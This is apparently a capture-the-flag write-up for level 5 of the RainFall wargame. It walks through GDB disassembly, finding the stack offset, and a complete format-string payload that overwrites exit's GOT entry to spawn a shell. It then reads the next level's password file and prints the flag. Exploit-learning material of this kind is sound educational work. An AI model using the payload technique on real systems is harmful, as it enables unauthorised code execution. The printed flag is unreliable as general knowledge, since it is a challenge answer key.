# Level5

## Analysis

You can find the decomp of the level [here](./level5_decomp.c). `main()` calls a function `n()` which uses `gets()` and `printf()`. There is also a funcion `o()` which isn't called but which contains a call to `system("/bin/sh")`.

We might be able to replace one of the `exit()` call!

## Exploit

```bash
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
(gdb)
```

When using GDB we can use `disas n` to get the asm of `n()` which will give us the address of plt exit. Now this address isn't what we're looking for since it's the address that points to another function that jumps to the real `exit()` as you can see when we disas the address of `exit@plt`.

Now `0x8049838` is the address we want to modify! 

To find the address we want to jump to, we will need to find the address of `o()` with `objdump -d level5`:

```bash
080484a4 <o>:
 80484a4:       55                      push   %ebp
 80484a5:       89 e5                   mov    %esp,%ebp
 80484a7:       83 ec 18                sub    $0x18,%esp
 80484aa:       c7 04 24 f0 85 04 08    movl   $0x80485f0,(%esp)
 80484b1:       e8 fa fe ff ff          call   80483b0 <system@plt>
 80484b6:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 80484bd:       e8 ce fe ff ff          call   8048390 <_exit@plt>
```

`080484a4` to decimal is `134513828`, this is what we need to write to our address!

Now to find the address offset where we need to write, we'll use the same concept as the previous exerices:

```bash
level5@RainFall:~$ ./level5                            
AAAA %x %x %x %x 
AAAA 200 b7fd1ac0 b7ff37d0 41414141 
```

"AAAA" is written at the fourth offset as we can see with the "41414141"

## Payload

This is what our payload will look like:

`[address] + [adress to write as padding - 4 (addr bytes)] + [stack offset]`

<details>
  <summary>Spoiler</summary>

   `python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' > /var/crash/tmp.txt`

   134513828 (which is the decimal representation of the address of `o()`) now becomes 134513824. The reason being that printf counts the first 4 bytes that we wrote (the address of `exit@plt`) in its total written bytes, hence why we remove 4 to correctly write "134513828" at the correct adress. You can't see them when you `cat` the file, but you can see them using `xdd` and notice that they are indeed present (which makes perfect sense). When you cat the file, you get this `8%134513824x%4$n`, however printf receives `\x38\x98\x04\x08%134513824x%4$n` to interpret. 

  We will write using the same trick as before `[offset$n]` which will write to the fourth address in the stack (which should be our first printf argument, so the address):

  ```bash
  level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' > /var/crash/exploit
  level5@RainFall:~$ cat /var/crash/exploit - | ./level5
  ```

  And we will be greeted a prompt:

  ```bash
  whoami
  level6
  cat /home/user/level6/.pass
  d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
  ```
</details>

## Flag

d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31